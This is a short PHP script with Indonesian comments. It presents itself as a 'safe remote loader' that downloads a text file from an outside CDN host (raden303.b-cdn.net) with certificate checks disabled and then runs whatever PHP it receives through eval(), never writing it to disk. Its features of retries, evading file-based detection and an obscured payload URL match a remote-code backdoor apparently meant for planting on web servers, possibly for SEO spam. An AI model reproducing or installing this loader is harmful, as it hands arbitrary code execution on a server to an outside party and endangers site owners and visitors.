<?php
/**
 * UNIVERSAL SAFE REMOTE LOADER
 * - Tidak menulis file โ’ tidak ada error F06
 * - Anti blank (LiteSpeed/CloudLinux fix)
 * - Anti 0KB
 * - Auto-retry 3x jika dipotong server
 * - Aman: hanya eval isi PHP
 */

$url = "https://raden303.b-cdn.net/seoraden_decoded.txt"; // Jangan Kepo Dong

function fetch_strict($url) {
    $tries = 0;
    $result = "";

    while ($tries < 3) { // auto retry 3x
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT        => 12,
            CURLOPT_USERAGENT      => "SafeLoader/2.0",
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
        ]);

        $result = curl_exec($ch);
        $err    = curl_error($ch);
        curl_close($ch);

        // Jika server memotong response (0KB)
        if ($result !== false && strlen(trim($result)) > 20) {
            return $result; // sukses
        }

        $tries++;
        usleep(250000); // delay 250ms
    }

    http_response_code(500);
    die("ERROR F07: Gagal fetch remote file โ’ $err");
}


// ----- FETCH -----
$code = fetch_strict($url);

// Validasi dasar (opsional)
if (strpos($code, "<?php") === false) {
    // aman biar tidak eval file aneh
    // Hapus check ini jika mau bebas
    die("ERROR F08: Remote file bukan PHP valid.");
}

// ----- EKSEKUSI TANPA WRITE FILE -----
try {
    eval("?>".$code);
} catch (Throwable $e) {
    http_response_code(500);
    echo "Eval Error: ".$e->getMessage();
}
